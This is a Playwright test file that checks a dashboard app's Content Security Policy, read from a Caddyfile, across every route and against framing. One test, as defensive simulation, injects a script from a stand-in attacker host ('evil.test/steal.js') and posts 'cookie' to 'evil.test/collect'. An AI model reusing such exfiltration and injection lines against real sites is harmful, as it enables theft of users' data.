import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { expect, test, type Page } from '@playwright/test';
import { mockApi, SLUG } from './support/mock-api';
import { mockOnboarding } from './support/onboarding-api';
import { drawnPayments } from './support/payments';
import { servePicturesFrom } from './support/products';

// KNOWN-GAPS §65, Slice 11.13a: the dashboard under its own Content Security Policy, as the console's was checked. The
// policy is read from deploy/Caddyfile's `(dashboard_csp)` block -- the one definition Caddy serves -- with the
// deployment's media and storage addresses filled in, and sent with every page as Caddy sends it. Every screen of the
// route tree loads under it with nothing refused; an injected script, a foreign fetch, a foreign image and framing are
// refused; the media and upload addresses, the brand fonts and the service worker are not. The policy does not depend
// on the screen size, so it is checked once, in the desktop project.

const MEDIA = 'https://media.lytro.test';
const STORAGE = 'https://storage.lytro.test';
const FOREIGN = 'https://evil.test';
// Another site that frames the app: a different origin on this machine (see `framing` below).
const FRAMER = 'http://127.0.0.1:4173';
const PIXEL = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=',
  'base64',
);

const root = (...parts: string[]) => resolve(import.meta.dirname, '..', ...parts);

/** The `(dashboard_csp)` block's headers, by lower-case name, with the deployment's addresses filled in. */
function policyHeaders(): Record<string, string> {
  const caddyfile = readFileSync(root('../../deploy/Caddyfile'), 'utf8');
  const block =
    /\n\(dashboard_csp\) \{\n([\s\S]*?)\n\}/.exec(caddyfile.replaceAll('\r\n', '\n'))?.[1] ?? '';
  return Object.fromEntries(
    [...block.matchAll(/header ([\w-]+) "([^"]+)"/g)].map(([, name = '', value = '']) => [
      name.toLowerCase(),
      value
        .replaceAll('{$MEDIA_PUBLIC_BASE_URL}', MEDIA)
        .replaceAll('{$MEDIA_STORAGE_ENDPOINT}', STORAGE),
    ]),
  );
}

/** Every path the route tree has, its parameters filled with what the mocked shop holds. */
function everyPath(): { signedOut: string[]; shop: string[] } {
  const tree = readFileSync(root('src/routeTree.gen.ts'), 'utf8');
  // The paths a person opens, not the route ids (`billing_/$paymentId`).
  const byFullPath = /export interface FileRoutesByFullPath \{([\s\S]*?)\n\}/.exec(tree)?.[1] ?? '';
  const paths = new Set(
    [...byFullPath.matchAll(/^\s+'(\/[^']*)': typeof /gm)].map(([, path = '']) =>
      path.length > 1 ? path.replace(/\/$/, '') : path,
    ),
  );
  const payment = drawnPayments()[0]?.id ?? '';
  const filled = [...paths].map((path) =>
    path
      .replace('$shop', SLUG)
      .replace('$productId', 'p-1')
      .replace('$paymentId', payment)
      .replace('$provider', 'google'),
  );
  return {
    signedOut: filled.filter((path) => !path.startsWith(`/${SLUG}`)),
    shop: filled.filter((path) => path.startsWith(`/${SLUG}`)),
  };
}

/**
 * Sends the policy with each of the app's own pages, as Caddy does, and keeps what the browser refuses; the returned
 * function reads what the current page has refused so far.
 */
async function underPolicy(page: Page, origin: string): Promise<() => Promise<string[]>> {
  const headers = policyHeaders();
  await page.addInitScript(() => {
    const refused: string[] = [];
    (window as unknown as { refused: string[] }).refused = refused;
    document.addEventListener('securitypolicyviolation', (event) => {
      refused.push(`${event.effectiveDirective} ${event.blockedURI}`);
    });
  });
  await page.route('**/*', async (route) => {
    const request = route.request();
    if (request.resourceType() !== 'document' || !request.url().startsWith(origin)) {
      await route.fallback();
      return;
    }
    const response = await route.fetch();
    await route.fulfill({ response, headers: { ...response.headers(), ...headers } });
  });
  return () => page.evaluate(() => (window as unknown as { refused?: string[] }).refused ?? []);
}

/** Opens each path in turn and lists what was refused on each, and any page left blank. */
async function walk(page: Page, paths: string[], refused: () => Promise<string[]>) {
  const found: string[] = [];
  for (const path of paths) {
    // From a blank page, so a redirect the last page was still making cannot cut this visit short.
    await page.goto('about:blank');
    await page.goto(path);
    await page.waitForLoadState('networkidle');
    if ((await page.locator('#root > *').count()) === 0) found.push(`${path}: nothing drawn`);
    for (const each of await refused()) found.push(`${path}: ${each}`);
  }
  return found;
}

// The framing site is another local origin, served by the test itself. Chrome's local-network checks would refuse any
// frame from a page with no address of its own -- the policy's refusal, not Chrome's, is the one to prove.
test.use({ launchOptions: { args: ['--disable-features=LocalNetworkAccessChecks'] } });

test.beforeEach(async ({ page }) => {
  test.skip(test.info().project.name !== 'desktop', 'the policy is the same on every screen size');
  // The shop's photos come from the media address, as in production, and load.
  await page.route(`${MEDIA}/**`, (route) =>
    route.fulfill({ contentType: 'image/png', body: PIXEL }),
  );
});

test.beforeAll(() => {
  servePicturesFrom(MEDIA);
});

test.afterAll(() => {
  servePicturesFrom(null);
});

test('the Caddyfile holds the dashboard’s policy, every address filled in', () => {
  const headers = policyHeaders();
  expect(headers['content-security-policy']).toContain("script-src 'self';");
  expect(headers['content-security-policy']).toContain("frame-ancestors 'none'");
  expect(headers['permissions-policy']).toBe(
    'camera=(self), microphone=(), geolocation=(), payment=()',
  );
  expect(Object.values(headers).join(' ')).not.toContain('{$');
  // The app's host imports it.
  const caddyfile = readFileSync(root('../../deploy/Caddyfile'), 'utf8').replaceAll('\r\n', '\n');
  expect(/app\.lytro\.app \{\n\timport dashboard_csp\n/.test(caddyfile)).toBe(true);
});

test.describe('every screen under the policy', () => {
  // A service worker would answer later visits from its cache, without the policy's headers.
  test.use({ serviceWorkers: 'block' });

  test('the signed-out pages load with nothing refused', async ({ page, baseURL }) => {
    test.setTimeout(120_000);
    const refused = await underPolicy(page, baseURL ?? '');
    await mockOnboarding(page, { language: 'en' });
    expect(await walk(page, everyPath().signedOut, refused)).toEqual([]);
  });

  test('every page of a shop loads with nothing refused', async ({ page, baseURL }) => {
    // A visit to each of some forty pages, each waiting for its requests to settle.
    test.setTimeout(240_000);
    const refused = await underPolicy(page, baseURL ?? '');
    await mockApi(page, { language: 'en' });
    const { shop } = everyPath();
    expect(shop.length).toBeGreaterThan(25);
    expect(await walk(page, shop, refused)).toEqual([]);
  });

  test('refuses an injected script, a foreign fetch and a foreign image; allows the media, uploads and brand fonts', async ({
    page,
    baseURL,
  }) => {
    const refused = await underPolicy(page, baseURL ?? '');
    await mockApi(page, { language: 'en' });
    await page.route(`${STORAGE}/**`, (route) => route.fulfill({ status: 200 }));
    await page.route('https://fonts.googleapis.com/**', (route) =>
      route.fulfill({ contentType: 'text/css', body: '' }),
    );
    await page.route(`${FOREIGN}/**`, (route) => route.fulfill({ status: 200, body: 'x' }));
    await page.goto(`/${SLUG}`);
    await page.waitForLoadState('networkidle');

    const tried = await page.evaluate(
      async ({ media, storage, foreign }) => {
        const settle = () => new Promise((done) => setTimeout(done, 400));
        const inline = document.createElement('script');
        inline.textContent = 'window.injected = true;';
        document.head.append(inline);
        const external = document.createElement('script');
        external.src = `${foreign}/steal.js`;
        document.head.append(external);
        const fonts = document.createElement('link');
        fonts.rel = 'stylesheet';
        fonts.href = 'https://fonts.googleapis.com/css2?family=Hind+Siliguri';
        document.head.append(fonts);
        const picture = new Image();
        picture.src = `${media}/megh/m-1.png`;
        const stranger = new Image();
        stranger.src = `${foreign}/pixel.png`;
        const sent = await fetch(`${foreign}/collect`, { method: 'POST', body: 'cookie' }).then(
          () => 'sent',
          () => 'refused',
        );
        const upload = await fetch(`${storage}/lytro-uploads/megh/up-1`, {
          method: 'PUT',
          body: 'bytes',
        }).then(
          (response) => response.status,
          () => 'refused',
        );
        await settle();
        return {
          injected: (window as unknown as { injected?: boolean }).injected === true,
          sent,
          upload,
          picture: picture.naturalWidth,
        };
      },
      { media: MEDIA, storage: STORAGE, foreign: FOREIGN },
    );

    expect(tried).toEqual({ injected: false, sent: 'refused', upload: 200, picture: 1 });
    const seen = await refused();
    expect(seen).toEqual(
      expect.arrayContaining([
        'script-src-elem inline',
        `script-src-elem ${FOREIGN}/steal.js`,
        `connect-src ${FOREIGN}/collect`,
        `img-src ${FOREIGN}/pixel.png`,
      ]),
    );
    expect(seen.filter((each) => !each.includes(FOREIGN) && !each.endsWith(' inline'))).toEqual([]);
  });

  test('keeps the camera for its own pages and turns off what it never uses', async ({
    page,
    baseURL,
  }) => {
    await underPolicy(page, baseURL ?? '');
    await mockApi(page, { language: 'en' });
    await page.goto(`/${SLUG}`);
    const allowed = await page.evaluate(() => {
      const policy = (
        document as unknown as { featurePolicy: { allowsFeature: (f: string) => boolean } }
      ).featurePolicy;
      return ['camera', 'microphone', 'geolocation', 'payment'].map((feature) => [
        feature,
        policy.allowsFeature(feature),
      ]);
    });
    expect(allowed).toEqual([
      ['camera', true],
      ['microphone', false],
      ['geolocation', false],
      ['payment', false],
    ]);
  });
});

test.describe('framing', () => {
  test.use({ serviceWorkers: 'block' });

  /** Another site framing the sign-in page: how much of the app it draws. */
  async function framedApp(page: Page, baseURL: string): Promise<number | undefined> {
    await mockOnboarding(page, { language: 'en' });
    await page.route(`${FRAMER}/frame`, (route) =>
      route.fulfill({
        contentType: 'text/html',
        body: `<iframe src="${baseURL}/sign-in" width="400" height="400"></iframe>`,
      }),
    );
    await page.goto(`${FRAMER}/frame`);
    await page.waitForTimeout(1500);
    return page
      .frames()
      .find((frame) => frame !== page.mainFrame())
      ?.locator('#root > *')
      .count();
  }

  test('refuses to be framed by another site', async ({ page, baseURL }) => {
    await underPolicy(page, baseURL ?? '');
    expect(await framedApp(page, baseURL ?? '')).toBe(0);
  });

  test('without the policy the same frame draws the app, so the check above can fail', async ({
    page,
    baseURL,
  }) => {
    expect(await framedApp(page, baseURL ?? '')).toBeGreaterThan(0);
  });
});

test('the service worker registers under the policy', async ({ page, baseURL }) => {
  const refused = await underPolicy(page, baseURL ?? '');
  await mockApi(page, { language: 'en' });
  await page.goto(`/${SLUG}`);
  const ready = await page.evaluate(() =>
    Promise.race([
      navigator.serviceWorker.ready.then(() => 'ready'),
      new Promise((done) => {
        setTimeout(() => {
          done('timed out');
        }, 10_000);
      }),
    ]),
  );
  expect(ready).toBe('ready');
  expect(await refused()).toEqual([]);
});
